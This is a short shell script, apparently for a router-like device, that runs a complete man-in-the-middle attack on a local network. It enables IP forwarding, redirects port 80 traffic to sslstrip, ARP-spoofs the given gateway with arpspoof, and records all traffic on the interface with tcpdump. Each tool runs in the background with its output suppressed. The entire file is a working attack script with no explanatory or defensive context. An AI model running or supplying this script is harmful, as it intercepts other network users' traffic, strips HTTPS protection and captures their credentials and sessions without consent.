if [ -e /etc/config/system ] ; then
	export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usb/usr/bin:/usb/usr/sbin
	export LD_LIBRARY_PATH=/lib:/usr/lib:/usb/lib:/usb/usr/lib
fi

interface=$1
gateway=$2
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
nohup sslstrip -s -w ../data/sslstrip_$interface.log -p 10000 >/dev/null 2>/dev/null &
nohup arpspoof -i $interface $gateway >/dev/null 2>../data/arpsoopf.log &
nohup tcpdump -w ../data/captura.pcap -i $interface >/dev/null 2>/dev/null &
